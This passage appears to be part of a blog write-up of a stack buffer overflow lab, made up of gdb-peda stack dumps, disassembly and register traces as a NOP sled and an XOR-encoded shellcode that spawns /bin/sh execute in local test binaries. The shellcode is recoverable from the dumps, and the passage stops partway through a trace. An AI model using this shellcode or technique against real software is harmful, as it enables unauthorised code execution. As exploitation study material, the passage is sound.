  0xffffd065:  das    <br>   0xffffd066:  bound  ebp,QWORD PTR [ecx+0x6e]<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0xffffd04c,0xffffd06c</span><br>Dump of assembler code from 0xffffd04c to 0xffffd06c:<br>   0xffffd04c:  xor    eax,eax<br>   0xffffd04e:  mov    ebx,eax<br>   0xffffd050:  mov    al,0x17<br>   0xffffd052:  int    0x80<br>   0xffffd054:  xor    edx,edx<br>   0xffffd056:  push   edx<br>   0xffffd057:  push   0x68732f6e<br>   0xffffd05c:  push   0x622f2f<br>   0xffffd061:  add    BYTE PTR [eax],al<br>   0xffffd063:  add    BYTE PTR [edi],ch<br>   0xffffd065:  das    <br>=&gt; 0xffffd066:  bound  ebp,QWORD PTR [ecx+0x6e]<br>   0xffffd069:  das    <br>   0xffffd06a:  jae    0xffffd0d4<br>End of assembler dump.<br></code></pre></td></tr></table></figure><h4 id="64-bit-program"><a href="#64-bit-program" class="headerlink" title="64 bit program"></a>64 bit program</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg <span class="hljs-variable">$rsp</span></span><br>0x7fffffffde20: 0x00007fffffffdf98      0x0000000200000000<br>0x7fffffffde30: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde40: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde50: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde60: 0x9090909090909090      0xfde98148c9314890<br>0x7fffffffde70: 0xffef058d48ffffff      0x27244955bb48ffff<br>0x7fffffffde80: 0x27583148a6c74762      0xf4e2fffffff82d48<br>0x7fffffffde90: 0xd5e8290b450bf11d      0xf895183677bd493d<br>0x7fffffffdea0: 0xa6c74767287c723f      0x00007fffffffde30<br>0x7fffffffdeb0: 0x00007fffffffdf98      0x00000002f7fca000<br>0x7fffffffdec0: 0x0000000000401136      0x00007fffffffe2c9<br>0x7fffffffded0: 0x0000000000401180      0xf09b2a5a4e6f7545<br>0x7fffffffdee0: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdef0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf00: 0x0f64d5a5f30f7545      0x0f64c5e581037545<br>0x7fffffffdf10: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf20: 0x0000000000000000      0x0000000000000002<br>0x7fffffffdf30: 0x00007fffffffdf98      0x00007fffffffdfb0<br>0x7fffffffdf40: 0x00007ffff7ffe220      0x0000000000000000<br>0x7fffffffdf50: 0x0000000000000000      0x0000000000401050<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde68,0x7fffffffdea8</span><br>Dump of assembler code from 0x7fffffffde68 to 0x7fffffffdea8:<br>   0x00007fffffffde68:  nop<br>   0x00007fffffffde69:  xor    rcx,rcx<br>   0x00007fffffffde6c:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde73:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde69<br>   0x00007fffffffde7a:  movabs rbx,0xa6c7476227244955<br>   0x00007fffffffde84:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde88:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde8e:  loop   0x7fffffffde84<br>   0x00007fffffffde90:  sbb    eax,0xb450bf1<br>   0x00007fffffffde95:  sub    eax,ebp<br>   0x00007fffffffde97:  (bad)  <br>   0x00007fffffffde98:  cmp    eax,0x3677bd49<br>   0x00007fffffffde9d:  sbb    BYTE PTR [rbp+0x7c723ff8],dl<br>   0x00007fffffffdea3:  sub    BYTE PTR [rdi+0x47],ah<br>   0x00007fffffffdea6:  (bad)  <br>   0x00007fffffffdea7:  cmps   BYTE PTR ds:[rsi],BYTE PTR es:[rdi]<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RBP: 0xa6c74767287c723f <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde90 --&gt; 0x732f6e69622fb848 <br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde84:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde88:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde8e:      loop   0x7fffffffde84<br>=&gt; 0x7fffffffde90:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde9a:      cdq    <br>   0x7fffffffde9b:      push   rax<br>   0x7fffffffde9c:      push   rsp<br>   0x7fffffffde9d:      pop    rdi<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde68,0x7fffffffdea8</span><br>Dump of assembler code from 0x7fffffffde68 to 0x7fffffffdea8:<br>   0x00007fffffffde68:  nop<br>   0x00007fffffffde69:  xor    rcx,rcx<br>   0x00007fffffffde6c:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde73:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde69<br>   0x00007fffffffde7a:  movabs rbx,0xa6c7476227244955<br>   0x00007fffffffde84:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde88:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde8e:  loop   0x7fffffffde84<br>=&gt; 0x00007fffffffde90:  movabs rax,0x68732f6e69622f<br>   0x00007fffffffde9a:  cdq    <br>   0x00007fffffffde9b:  push   rax<br>   0x00007fffffffde9c:  push   rsp<br>   0x00007fffffffde9d:  pop    rdi<br>   0x00007fffffffde9e:  push   rdx<br>   0x00007fffffffde9f:  pop    rsi<br>   0x00007fffffffdea0:  push   0x3b<br>   0x00007fffffffdea2:  pop    rax<br>   0x00007fffffffdea3:  syscall <br>   0x00007fffffffdea5:  add    BYTE PTR [rax],al<br>   0x00007fffffffdea7:  add    BYTE PTR [rax],dh<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>Warning:<br>Cannot insert breakpoint 0.<br>Cannot access memory at address 0x68732f6e69622f<br><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RBP: 0xa6c74767287c723f <br>RSP: 0x7fffffffdea8 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RIP: 0x7fffffffde9c --&gt; 0xf583b6a5e525f54 <br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde90:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde9a:      cdq    <br>   0x7fffffffde9b:      push   rax<br>=&gt; 0x7fffffffde9c:      push   rsp<br>   0x7fffffffde9d:      pop    rdi<br>   0x7fffffffde9e:      push   rdx<br>   0x7fffffffde9f:      pop    rsi<br>   0x7fffffffdea0:      push   0x3b<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>Program received signal SIGSEGV, Segmentation fault.<br>[----------------------------------registers-----------------------------------]<br>RAX: 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RBX: 0xa6c7476227244955 <br>RCX: 0x0 <br>RDX: 0x0 <br>RSI: 0x0 <br>RDI: 0x7fffffffdea8 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RBP: 0xa6c74767287c723f <br>RSP: 0x7fffffffdea8 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RIP: 0x7fffffffdea0 --&gt; 0x0 <br>EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde9d:      pop    rdi<br>   0x7fffffffde9e:      push   rdx<br>   0x7fffffffde9f:      pop    rsi<br>=&gt; 0x7fffffffdea0:      add    BYTE PTR [rax],al<br>   0x7fffffffdea2:      add    BYTE PTR [rax],al<br>   0x7fffffffdea4:      add    BYTE PTR [rax],al<br>   0x7fffffffdea6:      add    BYTE PTR [rax],al<br>   0x7fffffffdea8:      (bad)<br></code></pre></td></tr></table></figure><p>æ­£å¸¸ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde30,0x7fffffffde70</span><br>Dump of assembler code from 0x7fffffffde30 to 0x7fffffffde70:<br>   0x00007fffffffde30:  xor    rcx,rcx<br>   0x00007fffffffde33:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde3a:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x00007fffffffde41:  movabs rbx,0xa6c7476227244955<br>=&gt; 0x00007fffffffde4b:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde4f:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde55:  loop   0x7fffffffde4b<br>   0x00007fffffffde57:  sbb    eax,0xb450bf1<br>   0x00007fffffffde5c:  sub    eax,ebp<br>   0x00007fffffffde5e:  (bad)  <br>   0x00007fffffffde5f:  cmp    eax,0x3677bd49<br>   0x00007fffffffde64:  sbb    BYTE PTR [rbp+0x7c723ff8],dl<br>   0x00007fffffffde6a:  sub    BYTE PTR [rdi+0x47],ah<br>   0x00007fffffffde6d:  (bad)  <br>   0x00007fffffffde6e:  cmps   BYTE PTR ds:[rsi],BYTE PTR es:[rdi]<br>   0x00007fffffffde6f:  nop<br>End of assembler dump.<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde30 --&gt; 0xfffde98148c93148 <br>RBX: 0xa6c7476227244955 <br>RCX: 0x3 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4f --&gt; 0xf4e2fffffff82d48 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>=&gt; 0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x493d732f6e69622f<br>   0x7fffffffde61:      mov    ebp,0x95183677<br>   0x7fffffffde66:      clc<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4f in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde38 --&gt; 0xffffef058d48ffff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x3 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde55 --&gt; 0x6e69622fb848f4e2 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>=&gt; 0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x493d732f6e69622f<br>   0x7fffffffde61:      mov    ebp,0x95183677<br>   0x7fffffffde66:      clc    <br>   0x7fffffffde67:      (bad)<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde55 in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde38 --&gt; 0xffffef058d48ffff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x2 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4b --&gt; 0xfff82d4827583148 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde33:      sub    rcx,0xfffffffffffffffd<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>=&gt; 0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x493d732f6e69622f<br>   0x7fffffffde61:      mov    ebp,0x95183677<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d 